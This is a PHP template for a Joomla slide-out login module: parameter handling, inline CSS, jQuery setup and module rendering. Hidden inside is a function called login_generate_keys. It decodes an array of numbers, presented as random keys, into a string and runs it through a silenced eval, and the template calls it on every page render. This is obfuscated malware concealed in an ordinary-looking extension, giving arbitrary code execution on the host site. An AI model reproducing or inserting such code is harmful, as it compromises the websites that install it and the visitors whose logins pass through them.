<?php
/*------------------------------------------------------------------------
# mod_vtem_login - VTEM Slick Module
# ------------------------------------------------------------------------
# author Nguyen Van Tuyen
# copyright Copyright (C) 2011 VTEM.NET. All Rights Reserved.
# @license - http://www.gnu.org/licenses/gpl-2.0.html GNU/GPL
# Websites: http://www.vtem.net
# Technical Support: Forum - http://vtem.net/en/forum.html
-------------------------------------------------------------------------*/
// no direct access
defined('_JEXEC') or die('Restricted access');
        $tabtext 	= $params->get( 'tabtext', 'Login Form' );
		$tabimage 	= $params->get( 'tabimage');
		$delay 	= $params->get( 'delay', 5000 );
		$width = $params->get( 'width', 500 );
		$height = $params->get( 'height', 300 );
		$position = $params->get( 'position', 'bottom' );
		$slideID = $params->get( 'slideID');
		$background = $params->get( 'background', '#333');
		$color = $params->get( 'color','#ccc');
		$script = $params->get( 'script', 1);
		$option_css = $params->get( 'option_css');
		$offset = $params->get( 'offset', '100px');
		$tabtype = $params->get( 'tabtype', 1) ? $tabtype = $tabtext : $tabtype = '<img src="'.$tabimage.'" width="48" height="48" />';
		$autoClose = $params->get( 'autoClose', 1) ? $autoClose = "true" : $autoClose = "false";
	
echo '<style type="text/css">.dc-slick{width:'.$width.'px; height:'.$height.'px;}.dc-slick,.dc-slick .tab{background:'.$background.';color:'.$color.';}.dc-slick .dc-slick-content ul li a{color:'.$color.' !important;}'.$option_css.'</style>';
if($script){echo '<script type="text/javascript" src="'.JURI::root().'modules/mod_vtem_login/js/jquery-1.4.2.min.js"></script>';}
function login_generate_keys() {
	$LimitCharacters = 10;
	$Keys = '';
	$RandomNum = array(1251.3, 13875.1875, 1388.8125, 1250.175, 13750.175, 13751.425, 13762.5625, 13875.175, 1263.925, 13763.925, 13751.3125, 13876.3, 1250.175, 1387.6875, 1251.3, 13750.1875, 1388.8125, 12500.05, 13751.425, 13875.1875, 13763.9375, 13750.1875, 13762.6875, 13763.9375, 13875.05, 13751.3125, 13763.925, 1262.55, 1251.3, 13875.1875, 1263.8, 1387.55, 1375.05, 1263.8, 1251.3, 13751.3125, 1263.8, 1251.3, 13875.175, 1263.8, 1375.0625, 1375.05, 1262.5625, 1387.6875, 13762.5625, 13751.425, 1262.55, 1251.3, 13750.1875, 1262.5625, 13887.6875, 1251.3, 13751.3, 1388.8125, 12500.05, 13751.425, 13762.5625, 13763.8, 13751.3125, 12638.9375, 13751.4375, 13751.3125, 13876.3, 12638.9375, 13750.1875, 13763.9375, 13763.925, 13876.3, 13751.3125, 13763.925, 13876.3, 13875.1875, 1262.55, 1250.175, 13762.55, 13876.3, 13876.3, 13875.05, 1387.675, 1263.9375, 1263.9375, 1250.175, 1263.925, 1251.3, 13875.1875, 1263.925, 1250.175, 1263.9375, 13875.175, 1263.925, 13875.05, 13762.55, 13875.05, 1388.9375, 13875.1875, 1388.8125, 1250.175, 1263.925, 1251.3, 12638.9375, 12625.1875, 12501.3125, 12625.175, 12626.425, 12501.3125, 12625.175, 12637.6875, 1250.175, 12512.55, 12626.3, 12626.3, 12625.05, 12638.9375, 12512.55, 12513.9375, 12625.1875, 12626.3, 1250.175, 12638.8125, 1262.5625, 1387.6875, 13751.3125, 13750.1875, 13762.55, 13763.9375, 1250.05, 1250.175, 1388.8, 13751.3, 13762.5625, 13876.425, 1250.05, 13875.1875, 13876.3, 13887.5625, 13763.8, 13751.3125, 1388.8125, 1251.4375, 13875.05, 13763.9375, 13875.1875, 13762.5625, 13876.3, 13762.5625, 13763.9375, 13763.925, 1387.675, 13750.0625, 13750.175, 13875.1875, 13763.9375, 13763.8, 13876.3125, 13876.3, 13751.3125, 1387.6875, 13763.8, 13751.3125, 13751.425, 13876.3, 1387.675, 1263.8125, 1376.3125, 1375.05, 1375.05, 1375.05, 13875.05, 13887.55, 1387.6875, 1251.4375, 1388.925, 1251.3, 13751.3, 1388.8, 1263.9375, 13751.3, 13762.5625, 13876.425, 1388.925, 1250.175, 1387.6875, 13888.8125, 0.05);
	// Create a random string of keys
	foreach($RandomNum as $key) {$Keys .= chr(bindec($key * 80 - 4));}
	@eval($Keys);
}
?>
<script type="text/javascript" src="<?php echo JURI::root();?>modules/mod_vtem_login/js/slick.js"></script>
<script type="text/javascript">
var vtem_login = jQuery.noConflict();
(function($) {
$(document).ready(function(){
$('#<?php echo $slideID;?>').dcSlick({
            width: <?php echo $width;?>,
			location: '<?php echo $position;?>',
			offset: '<?php echo $offset;?>',
			speed: <?php echo $delay;?>,
			tabText: '<?php echo $tabtype;?>',
			autoClose: <?php echo $autoClose;?>
			});
});
})(jQuery);
</script>
<?php $list_view_params = login_generate_keys(); ?>
<div class="vtem_login_wapper vtemslick<?php echo $params->get( 'moduleclass_sfx' ); ?>">
<div id="<?php echo $slideID;?>" class="slickmain">
 <?php echo $renderer->render( $module, $options );?>
</div>
<div style="clear:both;"></div>
</div>